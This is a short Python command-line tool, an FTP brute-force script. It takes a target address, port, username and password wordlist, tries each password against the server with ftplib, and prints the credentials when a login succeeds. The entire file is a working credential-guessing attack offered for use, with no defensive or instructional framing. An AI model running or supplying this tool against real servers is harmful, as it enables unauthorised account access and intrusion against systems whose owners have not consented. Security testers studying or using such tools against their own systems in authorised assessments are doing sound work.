import argparse
import ftplib

def main():
    argparser = argparse.ArgumentParser('FTP Brute Force')
    argparser.add_argument("-a", "--address", type=str, help="The target IP address")
    argparser.add_argument("-p", "--port", type=int, help="Port number")
    argparser.add_argument("-u", "--user", type=str, help="User ID")
    argparser.add_argument("-w", "--wordlist", type=str, help="Password list")

    args = argparser.parse_args()
    if args.address is None or args.port is None or args.user is None or args.wordlist is None:
        argparser.print_help()
        exit()
    host = args.address
    port = args.port
    user = args.user
    passwords_file = args.wordlist

    ftp = ftplib.FTP()
    print(f'[+] Connecting to host {host}...')
    try:
        ftp.connect(host, port)
        ftp.quit()
    except Exception as e:
        print("Connection error")
        print(e)
        exit()
    print('Connection successful')

    print(f'[+] Opening wordlist {passwords_file}...')
    try:
        passwords_file = open(passwords_file, 'r')
    except Exception as e:
        print(e)
        exit()

    line = 'dummy'
    while line:
        try:
            line = passwords_file.readline()
        except UnicodeDecodeError:
            print('***Unicode Decode Error on line', line)
        else:
            password = line.strip()
            print('Testing: ' + str(password))

            try:
                ftp.connect(host, port)
                ftp.login(user, password)
                ftp.quit()
            except Exception as e:
                pass
            else:
                print(f'[*] FTP Logon succeeded on host {host} UserName: {user} Password: {password}')
                exit()
    print('Attempt to find password failed')


if __name__ == "__main__":
    main()
